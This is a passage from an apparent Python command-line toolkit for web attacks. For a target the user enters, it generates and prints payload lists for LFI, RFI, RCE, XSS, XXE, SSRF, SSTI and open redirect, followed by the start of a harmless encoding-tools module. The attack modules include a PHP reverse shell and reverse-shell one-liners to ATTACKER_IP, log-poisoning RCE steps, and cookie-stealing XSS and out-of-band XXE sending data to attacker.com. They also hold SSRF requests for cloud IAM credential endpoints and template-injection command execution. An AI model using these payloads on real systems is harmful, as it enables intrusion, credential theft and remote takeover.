                self.ssrf()
            elif choice == "7":
                self.ssti()
            elif choice == "8":
                self.open_redirect()
            elif choice == "0":
                break
            else:
                error("Invalid option!")
                time.sleep(1)

    def lfi(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ LFI - LOCAL FILE INCLUSION ]{Colors.ENDC}")
        separator()
        
        target = prompt("Enter target URL (e.g., http://site.com/page.php?file=)")
        if not target:
            error("No target provided!")
            press_enter()
            return
        
        payloads = {
            "Linux /etc/passwd": f"{target}../../../../etc/passwd",
            "Linux /etc/passwd (URL)": f"{target}%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "Linux /etc/shadow": f"{target}../../../../etc/shadow",
            "Linux /etc/hosts": f"{target}../../../../etc/hosts",
            "Linux /proc/self/environ": f"{target}../../../../proc/self/environ",
            "Linux /proc/self/cmdline": f"{target}../../../../proc/self/cmdline",
            "Linux /proc/self/fd/0": f"{target}../../../../proc/self/fd/0",
            "Linux /proc/version": f"{target}../../../../proc/version",
            "Linux /proc/mounts": f"{target}../../../../proc/mounts",
            "Linux access.log": f"{target}../../../../var/log/apache2/access.log",
            "Linux error.log": f"{target}../../../../var/log/apache2/error.log",
            "Windows win.ini": f"{target}..%5c..%5c..%5c..%5cwindows%5cwin.ini",
            "Windows hosts": f"{target}..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "Windows boot.ini": f"{target}../../../../boot.ini",
            "Windows system.ini": f"{target}..\\..\\..\\..\\windows\\system.ini",
            "PHP Filter base64": f"{target}php://filter/read=convert.base64-encode/resource=../../../etc/passwd",
            "PHP Filter config": f"{target}php://filter/read=convert.base64-encode/resource=config.php",
            "PHP Input": f"{target}php://input",
            "PHP Data": f"{target}data://text/plain,<?php system($_GET['cmd']); ?>",
            "PHP Expect": f"{target}expect://ls",
            "File Wrapper": f"{target}file:///etc/passwd",
            "Null Byte": f"{target}../../../../etc/passwd%00",
            "Double Encoding": f"{target}%252e%252e%252fetc%252fpasswd",
            "UTF-8 Overlong": f"{target}%c0%afetc%c0%afpasswd",
            "Path Truncation": f"{target}../../../../etc/passwd..........[add_dots]",
            "Wrapper gzip": f"{target}compress.zlib://../../../../etc/passwd",
            "Wrapper bzip": f"{target}compress.bzip2://../../../../etc/passwd"
        }
        
        for name, payload in payloads.items():
            print(f"\n{Colors.OKGREEN}[+] {name}:{Colors.ENDC}")
            print(f"{Colors.WHITE}    {payload}{Colors.ENDC}")
        
        separator()
        print(f"\n{Colors.OKCYAN}LFI to RCE via Log Poisoning:{Colors.ENDC}")
        print(f"{Colors.WHITE}1. Include access.log via LFI{Colors.ENDC}")
        print(f"{Colors.WHITE}2. Poison User-Agent: <?php system($_GET['cmd']); ?>{Colors.ENDC}")
        print(f"{Colors.WHITE}3. Access: {target}../../../../var/log/apache2/access.log&cmd=whoami{Colors.ENDC}")
        
        press_enter()

    def rfi(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ RFI - REMOTE FILE INCLUSION ]{Colors.ENDC}")
        separator()
        
        target = prompt("Enter target URL (e.g., http://site.com/page.php?file=)")
        attacker = prompt("Enter your attacker IP/URL (e.g., http://attacker.com/shell.txt)")
        
        if not target or not attacker:
            error("Missing required inputs!")
            press_enter()
            return
        
        payloads = {
            "Basic RFI": f"{target}{attacker}",
            "RFI with ?": f"{target}{attacker}?",
            "RFI with %00": f"{target}{attacker}%00",
            "RFI with #": f"{target}{attacker}%23",
            "HTTP Wrapper": f"{target}http://{attacker}",
            "HTTPS Wrapper": f"{target}https://{attacker}",
            "FTP Wrapper": f"{target}ftp://{attacker}",
            "SMB Wrapper": f"{target}\\\\{attacker}\\share\\file.txt",
            "PHP Include": f"{target}php://input (POST: <?php system('whoami'); ?>)",
            "Expect RCE": f"{target}expect://curl {attacker}",
            "Data URI": f"{target}data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
        }
        
        for name, payload in payloads.items():
            print(f"\n{Colors.OKGREEN}[+] {name}:{Colors.ENDC}")
            print(f"{Colors.WHITE}    {payload}{Colors.ENDC}")
        
        separator()
        attacker_ip = attacker.split('//')[-1].split('/')[0] if '//' in attacker else attacker.split('/')[0]
        print(f"\n{Colors.OKCYAN}PHP Reverse Shell (save as shell.php):{Colors.ENDC}")
        print(f"""
{Colors.WHITE}<?php
    $ip = '{attacker_ip}';
    $port = 4444;
    $sock = fsockopen($ip, $port);
    $proc = proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>{Colors.ENDC}
        """)
        
        press_enter()

    def rce(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ RCE - REMOTE CODE EXECUTION ]{Colors.ENDC}")
        separator()
        
        target = prompt("Enter target URL (e.g., http://site.com/page.php?cmd=)")
        if not target:
            error("No target provided!")
            press_enter()
            return
        
        payloads = {
            "system()": f"{target}<?php system('whoami'); ?>",
            "system() v2": f"{target}system('whoami')",
            "exec()": f"{target}exec('whoami')",
            "shell_exec()": f"{target}shell_exec('whoami')",
            "passthru()": f"{target}passthru('whoami')",
            "popen()": f"{target}popen('whoami', 'r')",
            "proc_open()": f"{target}proc_open('whoami', array(), array())",
            "pcntl_exec()": f"{target}pcntl_exec('/bin/sh', array('-c', 'whoami'))",
            "Backtick cmd": f"{target}{BTICK}whoami{BTICK}",
            "$()": f"{target}$(whoami)",
            "eval()": f"{target}eval('echo shell_exec(\"whoami\");')",
            "assert()": f"{target}assert('shell_exec(\"whoami\")')",
            "preg_replace /e": f"{target}preg_replace('/.*/e', 'shell_exec(\"whoami\")', 'x')",
            "create_function": f"{target}$func = create_function('', 'shell_exec(\"whoami\");'); $func();",
            "ReflectionFunction": f"{target}$f = new ReflectionFunction('system'); $f->invoke('whoami');",
            "Python os.system": f"{target}__import__('os').system('whoami')",
            "Python subprocess": f"{target}__import__('subprocess').check_output(['whoami'])",
            "Perl system": f"{target}perl -e 'system(\"whoami\")'",
            "Ruby system": f"{target}ruby -e 'system(\"whoami\")'",
            "Node.js child_process": f"{target}require('child_process').exec('whoami')",
            "Bash Command Injection": f"{target};whoami",
            "Bash Command Injection &&": f"{target}&&whoami",
            "Bash Command Injection ||": f"{target}||whoami",
            "Bash Command Injection |": f"{target}|whoami",
            "Bash Backticks": f"{target}`whoami`",
            "Bash $()": f"{target}$(whoami)",
            "Shellshock": f"{{}} {{()}}; {{;}}; /bin/bash -c 'whoami'",
            "AWK RCE": f"{target}awk 'BEGIN{{system(\"whoami\")}}'",
            "Sed RCE": f"{target}sed 's/.*/whoami/e'",
            "Find RCE": f"{target}find . -exec whoami \\;",
            "Zip RCE": f"{target}unzip -Z -h | whoami",
            "Tar RCE": f"{target}tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=whoami"
        }
        
        for name, payload in payloads.items():
            print(f"\n{Colors.OKGREEN}[+] {name}:{Colors.ENDC}")
            print(f"{Colors.WHITE}    {payload}{Colors.ENDC}")
        
        separator()
        print(f"\n{Colors.OKCYAN}Reverse Shell One-Liners:{Colors.ENDC}\n")
        rev_shells = {
            "Bash": "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
            "Python": "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "Python3": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "Perl": "perl -e 'use Socket;$i=\"ATTACKER_IP\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
            "Ruby": "ruby -rsocket -e'f=TCPSocket.open(\"ATTACKER_IP\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            "Netcat": "nc -e /bin/sh ATTACKER_IP 4444",
            "PHP": "php -r '$sock=fsockopen(\"ATTACKER_IP\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "Java": "r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/ATTACKER_IP/4444;cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[]); p.waitFor();",
            "Lua": "lua -e 'require(\"socket\");require(\"os\");t=socket.tcp();t:connect(\"ATTACKER_IP\",\"4444\");os.execute(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "Golang": "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"ATTACKER_IP:4444\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go"
        }
        
        for name, shell in rev_shells.items():
            print(f"{Colors.OKGREEN}[+] {name}:{Colors.ENDC}")
            print(f"{Colors.WHITE}    {shell}{Colors.ENDC}")
        
        press_enter()

    def xss(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ XSS - CROSS SITE SCRIPTING ]{Colors.ENDC}")
        separator()
        
        print(f"\n{Colors.WARNING}Basic XSS Payloads:{Colors.ENDC}\n")
        
        basic = [
            ("Basic script", "<script>alert('r7han')</script>"),
            ("Script src", "<script src=//xss.report/c/rehuux></script>"),
            ("IMG onerror", "<img src=x onerror=alert('r7han')>"),
            ("IMG onload", "<img src=x onload=alert('r7han')>"),
            ("Body onload", "<body onload=alert('r7han')>"),
            ("SVG onload", "<svg onload=alert('r7han')>"),
            ("SVG with script", "<svg><script>alert('r7han')</script></svg>"),
            ("Input autofocus", "<input autofocus onfocus=alert('r7han')>"),
            ("Input onfocus", "<input onfocus=alert('r7han') autofocus>"),
            ("Textarea autofocus", "<textarea autofocus onfocus=alert('r7han')>"),
            ("Video onerror", "<video src=x onerror=alert('r7han')>"),
            ("Audio onerror", "<audio src=x onerror=alert('r7han')>"),
            ("Details ontoggle", "<details open ontoggle=alert('r7han')>"),
            ("Select onfocus", "<select autofocus onfocus=alert('r7han')>"),
            ("Marquee", "<marquee onstart=alert('r7han')>"),
            ("Meter onmouseover", "<meter onmouseover=alert('r7han')>"),
            ("Object data", "<object data=javascript:alert('r7han')>"),
            ("Embed src", "<embed src=javascript:alert('r7han')>"),
            ("Iframe src", "<iframe src=javascript:alert('r7han')>"),
            ("Anchor href", "<a href=javascript:alert('r7han')>click</a>")
        ]
        
        for name, payload in basic:
            print(f"{Colors.OKGREEN}[+] {name}:{Colors.ENDC}")
            print(f"{Colors.WHITE}    {payload}{Colors.ENDC}")
        
        separator()
        print(f"\n{Colors.WARNING}Advanced XSS Payloads:{Colors.ENDC}\n")
        
        advanced = [
            ("Event Handler", "<div onpointerover=\"alert('r7han')\">MOVE HERE</div>"),
            ("DOM Clobbering", "<img name=body onerror=alert('r7han')>"),
            ("Template Injection", "{{constructor.constructor('alert(\"r7han\")')()}}"),
            ("AngularJS", "{{$on.constructor('alert(\"r7han\")')()}}"),
            ("Vue.js", "{{constructor.constructor('alert(\"r7han\")')()}}"),
            ("JQuery", "<img src=x onerror=$.globalEval('alert(\"r7han\")')>"),
            ("Polyglot", "jaVasCript:/*-/*`/*\\`/*'/*{Colors.BLANK}*/**(/* o_o/'+alert('r7han')+'//'>"),
            ("Bypass space", "<img/src=x/onerror=alert('r7han')>"),
            ("Bypass quote", "<img src=x onerror=alert&#40;'r7han'&#41;>"),
            ("Bypass parenthesis", "<img src=x onerror=alert&#40;1&#41;>"),
            ("Hex encode", "<img src=x onerror=eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29')>"),
            ("Unicode escape", "<img src=x onerror=eval('\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029')>"),
            ("Char code", "<img src=x onerror=String.fromCharCode(97,108,101,114,116,40,49,41)>")
        ]
        
        for name, payload in advanced:
            print(f"{Colors.OKGREEN}[+] {name}:{Colors.ENDC}")
            print(f"{Colors.WHITE}    {payload}{Colors.ENDC}")
        
        separator()
        print(f"\n{Colors.WARNING}XSS Filter Evasion:{Colors.ENDC}\n")
        
        evasion = [
            ("No script tag", "<img src=x onerror=alert('r7han')>"),
            ("No event handler", "<svg><animate onbegin=alert('r7han') attributeName=x>"),
            ("No angle brackets", "&lt;img src=x onerror=alert('r7han')&gt;"),
            ("Uppercase", "<SCRIPT>ALERT('r7han')</SCRIPT>"),
            ("Mixed case", "<ScRiPt>AlErT('r7han')</ScRiPt>"),
            ("Double encoding", "%253Cscript%253Ealert('r7han')%253C%252Fscript%253E"),
            ("HTML entities", "&lt;script&gt;alert(&quot;r7han&quot;)&lt;/script&gt;"),
            ("URL encoding", "%3Cscript%3Ealert('r7han')%3C%2Fscript%3E"),
            ("Unicode normalize", "<sc\u0072ipt>alert('r7han')</sc\u0072ipt>"),
            ("Nested tags", "<<script>script>alert('r7han')<</script>/script>"),
            ("Alert alternatives", "<script>confirm('r7han')</script>"),
            ("Prompt alternative", "<script>prompt('r7han')</script>"),
            ("Fetch data", "<script>fetch('http://attacker.com?c='+document.cookie)</script>"),
            ("Steal cookie", "<img src=x onerror=\"document.location='http://attacker.com?c='+document.cookie\">")
        ]
        
        for name, payload in evasion:
            print(f"{Colors.OKGREEN}[+] {name}:{Colors.ENDC}")
            print(f"{Colors.WHITE}    {payload}{Colors.ENDC}")
        
        separator()
        print(f"\n{Colors.OKCYAN}XSS in Different Contexts:{Colors.ENDC}\n")
        
        contexts = {
            "HTML Context": "<div>XSS_HERE</div>  -->  <div><script>alert(1)</script></div>",
            "Attribute Context (single)": f"<input value='XSS_HERE'>  -->  <input value='' onfocus=alert(1) autofocus '>",
            "Attribute Context (double)": f'<input value="XSS_HERE">  -->  <input value="" onfocus=alert(1) autofocus ">',
            "JavaScript Context": "<script>var x='XSS_HERE';</script>  -->  <script>var x='';alert(1)//';</script>",
            "URL Context": "<a href='XSS_HERE'>click</a>  -->  <a href='javascript:alert(1)'>click</a>",
            "Style Context": "<style>.x{background:XSS_HERE}</style>  -->  <style>.x{background:url(javascript:alert(1))}</style>"
        }
        
        for ctx, example in contexts.items():
            print(f"{Colors.OKGREEN}[+] {ctx}:{Colors.ENDC}")
            print(f"{Colors.WHITE}    {example}{Colors.ENDC}")
        
        press_enter()

    def xxe(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ XXE - XML EXTERNAL ENTITY ]{Colors.ENDC}")
        separator()
        
        print(f"\n{Colors.WARNING}XXE Payloads:{Colors.ENDC}\n")
        
        payloads = {
            "Basic File Read": """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>""",
            "PHP Filter": """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
]>
<foo>&xxe;</foo>""",
            "Remote DTD": """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<foo>test</foo>""",
            "Blind OOB": """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/data.dtd">
  %dtd;
]>
<foo>&send;</foo>""",
            "Error Based": """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///nonexistent">
]>
<foo>&xxe;</foo>""",
            "SSRF": """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal.service/admin">
]>
<foo>&xxe;</foo>""",
            "Local Network Scan": """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:8080">
]>
<foo>&xxe;</foo>""",
            "Windows File": """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">
]>
<foo>&xxe;</foo>""",
            "Denial of Service (Billion Laughs)": """<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>"""
        }
        
        for name, payload in payloads.items():
            print(f"\n{Colors.OKGREEN}[+] {name}:{Colors.ENDC}")
            print(f"{Colors.WHITE}{payload}{Colors.ENDC}")
        
        separator()
        print(f"\n{Colors.OKCYAN}Remote DTD (evil.dtd) for OOB XXE:{Colors.ENDC}")
        print(f"""
{Colors.WHITE}<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;{Colors.ENDC}
        """)
        
        press_enter()

    def ssrf(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ SSRF - SERVER SIDE REQUEST FORGERY ]{Colors.ENDC}")
        separator()
        
        target = prompt("Enter target URL (e.g., http://site.com/fetch?url=)")
        if not target:
            error("No target provided!")
            press_enter()
            return
        
        payloads = {
            "Localhost": f"{target}http://127.0.0.1/",
            "Localhost port 22": f"{target}http://127.0.0.1:22/",
            "Localhost port 80": f"{target}http://127.0.0.1:80/",
            "Localhost port 3306": f"{target}http://127.0.0.1:3306/",
            "Localhost port 6379": f"{target}http://127.0.0.1:6379/",
            "Localhost port 8080": f"{target}http://127.0.0.1:8080/",
            "Localhost port 9200": f"{target}http://127.0.0.1:9200/",
            "AWS Metadata": f"{target}http://169.254.169.254/latest/meta-data/",
            "AWS IAM": f"{target}http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "GCP Metadata": f"{target}http://metadata.google.internal/computeMetadata/v1/",
            "Azure Metadata": f"{target}http://169.254.169.254/metadata/instance?api-version=2017-12-01",
            "Docker API": f"{target}http://127.0.0.1:2375/v1.24/containers/json",
            "Kubernetes": f"{target}https://kubernetes.default.svc.cluster.local/",
            "Kubelet": f"{target}https://127.0.0.1:10250/pods",
            "ETCD": f"{target}http://127.0.0.1:2379/v2/keys",
            "Consul": f"{target}http://127.0.0.1:8500/v1/agent/self",
            "File Protocol": f"{target}file:///etc/passwd",
            "Dict Protocol": f"{target}dict://127.0.0.1:6379/info",
            "SFTP Protocol": f"{target}sftp://127.0.0.1:22/",
            "Gopher HTTP": f"{target}gopher://127.0.0.1:80/_GET%20/admin%20HTTP/1.1",
            "Gopher MySQL": f"{target}gopher://127.0.0.1:3306/_",
            "Gopher Redis": f"{target}gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall",
            "LDAP": f"{target}ldap://127.0.0.1:389/",
            "SMB": f"{target}smb://127.0.0.1/",
            "IP Decimal": f"{target}http://2130706433/",
            "IP Hex": f"{target}http://0x7f000001/",
            "IP Octal": f"{target}http://0177.0000.0000.0001/",
            "Domain Redirect": f"{target}http://spoofed.burpcollaborator.net/",
            "DNS Rebinding": f"{target}http://7f000001.1.rbndr.us/"
        }
        
        for name, payload in payloads.items():
            print(f"\n{Colors.OKGREEN}[+] {name}:{Colors.ENDC}")
            print(f"{Colors.WHITE}    {payload}{Colors.ENDC}")
        
        separator()
        print(f"\n{Colors.OKCYAN}Cloud Metadata Endpoints:{Colors.ENDC}\n")
        
        cloud_endpoints = {
            "AWS EC2": "http://169.254.169.254/latest/meta-data/",
            "AWS EC2 IAM": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "AWS ECS": "http://169.254.170.2/v2/credentials/",
            "GCP": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "Azure": "http://169.254.169.254/metadata/instance?api-version=2017-12-01",
            "DigitalOcean": "http://169.254.169.254/metadata/v1.json",
            "Oracle Cloud": "http://192.0.0.192/latest/meta-data/",
            "Alibaba Cloud": "http://100.100.100.200/latest/meta-data/",
            "OpenStack": "http://169.254.169.254/openstack/latest/meta_data.json",
            "Packet": "https://metadata.packet.net/metadata"
        }
        
        for service, endpoint in cloud_endpoints.items():
            print(f"{Colors.OKGREEN}[+] {service}:{Colors.ENDC}")
            print(f"{Colors.WHITE}    {endpoint}{Colors.ENDC}")
        
        press_enter()

    def ssti(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ SSTI - SERVER SIDE TEMPLATE INJECTION ]{Colors.ENDC}")
        separator()
        
        print(f"\n{Colors.WARNING}Template Engine Detection:{Colors.ENDC}\n")
        
        detection = {
            "Jinja2/Twig": "{{7*7}} --> 49",
            "Mako": "${7*7} --> 49",
            "ERB (Ruby)": "<%= 7*7 %> --> 49",
            "Handlebars": "{{#with \"s\" as |string|}}{{#with \"e\"}}{{this}}{{/with}}{{/with}}",
            "Smarty": "{7*7} --> 49",
            "Velocity": "#set($x=7*7)$x --> 49",
            "Freemarker": "${7*7} --> 49",
            "Thymeleaf": "th:text=\"${7*7}\" --> 49",
            "ASP.NET Razor": "@(7*7) --> 49",
            "Django/Jinja2": "{% debug %}",
            "Tornado": "{{handler.settings}}",
            "Flask": "{{config}}",
            "Angular": "{{constructor.constructor('alert(1)')()}}"
        }
        
        for engine, test in detection.items():
            print(f"{Colors.OKGREEN}[+] {engine}:{Colors.ENDC}")
            print(f"{Colors.WHITE}    Test: {test}{Colors.ENDC}")
        
        separator()
        print(f"\n{Colors.WARNING}Jinja2/Python SSTI Payloads:{Colors.ENDC}\n")
        
        jinja2 = [
            ("Read file", "{{''.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}"),
            ("Execute command", "{{''.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read()}}"),
            ("Config dump", "{{config}}"),
            ("Bypass filters", "{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')()}}"),
            ("Class MRO", "{{''.__class__.__mro__}}"),
            ("Subclasses", "{{''.__class__.__mro__[1].__subclasses__()}}"),
            ("GET request", "{{request.args.get('cmd')}}"),
            ("Cookie access", "{{request.cookies}}"),
            ("Headers", "{{request.headers}}"),
            ("Environment", "{{request.environ}}")
        ]
        
        for name, payload in jinja2:
            print(f"{Colors.OKGREEN}[+] {name}:{Colors.ENDC}")
            print(f"{Colors.WHITE}    {payload}{Colors.ENDC}")
        
        separator()
        print(f"\n{Colors.WARNING}Twig/PHP SSTI Payloads:{Colors.ENDC}\n")
        
        twig = [
            ("Execute command", "{{['id']|filter('system')}}"),
            ("Read file", "{{['cat /etc/passwd']|filter('system')}}"),
            ("Debug info", "{{_self}}"),
            ("Environment", "{{app.request.server.all}}"),
            ("PHP Info", "{{['phpinfo()']|filter('assert')}}"),
            ("Shell exec", "{{['whoami']|filter('shell_exec')}}")
        ]
        
        for name, payload in twig:
            print(f"{Colors.OKGREEN}[+] {name}:{Colors.ENDC}")
            print(f"{Colors.WHITE}    {payload}{Colors.ENDC}")
        
        separator()
        print(f"\n{Colors.WARNING}Ruby/ERB SSTI:{Colors.ENDC}\n")
        
        ruby = [
            ("Execute command", "<%= system('whoami') %>"),
            ("Read file", "<%= File.open('/etc/passwd').read %>"),
            ("Environment", "<%= ENV %>")
        ]
        
        for name, payload in ruby:
            print(f"{Colors.OKGREEN}[+] {name}:{Colors.ENDC}")
            print(f"{Colors.WHITE}    {payload}{Colors.ENDC}")
        
        press_enter()

    def open_redirect(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ OPEN REDIRECT ]{Colors.ENDC}")
        separator()
        
        target = prompt("Enter target URL (e.g., http://site.com/redirect?url=)")
        if not target:
            error("No target provided!")
            press_enter()
            return
        
        attacker = prompt("Enter attacker URL (e.g., http://evil.com)")
        if not attacker:
            attacker = "http://evil.com"
        
        payloads = {
            "Simple redirect": f"{target}{attacker}",
            "With protocol": f"{target}https://{attacker.split('://')[-1]}",
            "Double slash": f"{target}//{attacker.split('://')[-1]}",
            "Triple slash": f"{target}///{attacker.split('://')[-1]}",
            "Backslash": f"{target}\\{attacker.split('://')[-1]}",
            "At symbol": f"{target}@{attacker.split('://')[-1]}",
            "With port": f"{target}{attacker}:80/",
            "Fragment only": f"{target}#{attacker}",
            "Question mark": f"{target}?{attacker}",
            "URL encoded": f"{target}{urllib.parse.quote(attacker)}",
            "Double encoded": f"{target}{urllib.parse.quote(urllib.parse.quote(attacker))}",
            "Unicode": f"{target}\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f{attacker.split('://')[-1]}",
            "Mixed case": f"{target}HtTp://{attacker.split('://')[-1]}",
            "Tab encode": f"{target}%09{attacker}",
            "Newline encode": f"{target}%0a{attacker}",
            "Carriage return": f"{target}%0d{attacker}",
            "IP address": f"{target}http://123.123.123.123",
            "IP decimal": f"{target}http://2066565123",
            "IP hex": f"{target}http://0x7b7b7b7b",
            "IP octal": f"{target}http://0173.0173.0173.0173",
            "XSS via redirect": f"{target}javascript:alert('r7han')",
            "Data URI": f"{target}data:text/html,<script>alert('r7han')</script>"
        }
        
        for name, payload in payloads.items():
            print(f"\n{Colors.OKGREEN}[+] {name}:{Colors.ENDC}")
            print(f"{Colors.WHITE}    {payload}{Colors.ENDC}")
        
        press_enter()


# ─────────────────────────────────────────────────────────────────────────────
# MODULE 3: ENCODING/DECODING TOOLS
# ─────────────────────────────────────────────────────────────────────────────

class EncodingTools:
    def menu(self):
        while True:
            clear()
            banner()
            print(f"{Colors.OKCYAN}{Colors.BOLD}[ ENCODING/DECODING TOOLS ]{Colors.ENDC}")
            separator()
            print(f"""
    {Colors.OKGREEN}[1]{Colors.ENDC} URL Encode
    {Colors.OKGREEN}[2]{Colors.ENDC} URL Decode
    {Colors.OKGREEN}[3]{Colors.ENDC} Base64 Encode
    {Colors.OKGREEN}[4]{Colors.ENDC} Base64 Decode
    {Colors.OKGREEN}[5]{Colors.ENDC} Hex Encode
    {Colors.OKGREEN}[6]{Colors.ENDC} Hex Decode
    {Colors.OKGREEN}[7]{Colors.ENDC} Binary Encode
    {Colors.OKGREEN}[8]{Colors.ENDC} Binary Decode
    {Colors.OKGREEN}[9]{Colors.ENDC} ASCII to Char
    {Colors.OKGREEN}[10]{Colors.ENDC} Char to ASCII
    {Colors.OKGREEN}[11]{Colors.ENDC} ROT13
    {Colors.OKGREEN}[12]{Colors.ENDC} MD5 Hash
    {Colors.OKGREEN}[13]{Colors.ENDC} SHA1 Hash
    {Colors.OKGREEN}[14]{Colors.ENDC} SHA256 Hash
    {Colors.OKGREEN}[15]{Colors.ENDC} SHA512 Hash
    {Colors.OKGREEN}[16]{Colors.ENDC} HTML Entities Encode
    {Colors.OKGREEN}[17]{Colors.ENDC} HTML Entities Decode
    {Colors.OKGREEN}[18]{Colors.ENDC} Unicode Escape
    {Colors.OKGREEN}[19]{Colors.ENDC} JSON Escape
    {Colors.OKGREEN}[20]{Colors.ENDC} All Encodings (multi)
    {Colors.OKGREEN}[0]{Colors.ENDC} Back to Main Menu
            """)
            choice = prompt("Select an option")
            
            if choice == "1":
                self.url_encode()
            elif choice == "2":
                self.url_decode()
            elif choice == "3":
                self.base64_encode()
            elif choice == "4":
                self.base64_decode()
            elif choice == "5":
                self.hex_encode()
            elif choice == "6":
                self.hex_decode()
            elif choice == "7":
                self.binary_encode()
            elif choice == "8":
                self.binary_decode()
            elif choice == "9":
                self.ascii_to_char()
            elif choice == "10":
                self.char_to_ascii()
            elif choice == "11":
                self.rot13()
            elif choice == "12":
                self.md5_hash()
            elif choice == "13":
                self.sha1_hash()
            elif choice == "14":
                self.sha256_hash()
            elif choice == "15":
                self.sha512_hash()
            elif choice == "16":
                self.html_encode()
            elif choice == "17":
                self.html_decode()
            elif choice == "18":
                self.unicode_escape()
            elif choice == "19":
                self.json_escape()
            elif choice == "20":
                self.all_encodings()
            elif choice == "0":
                break
            else:
                error("Invalid option!")
                time.sleep(1)
    
    def url_encode(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ URL ENCODE ]{Colors.ENDC}")
        separator()
        
        text = prompt("Enter text to encode")
        if not text:
            error("No input provided!")
            press_enter()
            return
        
        encoded = urllib.parse.quote(text)
        print(f"\n{Colors.OKGREEN}Input:{Colors.ENDC}")
        print(f"{Colors.WHITE}{text}{Colors.ENDC}")
        print(f"\n{Colors.OKGREEN}URL Encoded:{Colors.ENDC}")
        print(f"{Colors.WHITE}{encoded}{Colors.ENDC}")
        
        # Component encoding (spaces -> +)
        encoded_plus = urllib.parse.quote_plus(text)
        print(f"\n{Colors.OKGREEN}URL Encoded (plus):{Colors.ENDC}")
        print(f"{Colors.WHITE}{encoded_plus}{Colors.ENDC}")
        
        # Safe characters
        print(f"\n{Colors.OKGREEN}URL Encoded (safe='/'):{Colors.ENDC}")
        print(f"{Colors.WHITE}{urllib.parse.quote(text, safe='/')}{Colors.ENDC}")
        
        press_enter()
    
    def url_decode(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ URL DECODE ]{Colors.ENDC}")
        separator()
        
        text = prompt("Enter text to decode")
        if not text:
            error("No input provided!")
            press_enter()
            return
        
        try:
            decoded = urllib.parse.unquote(text)
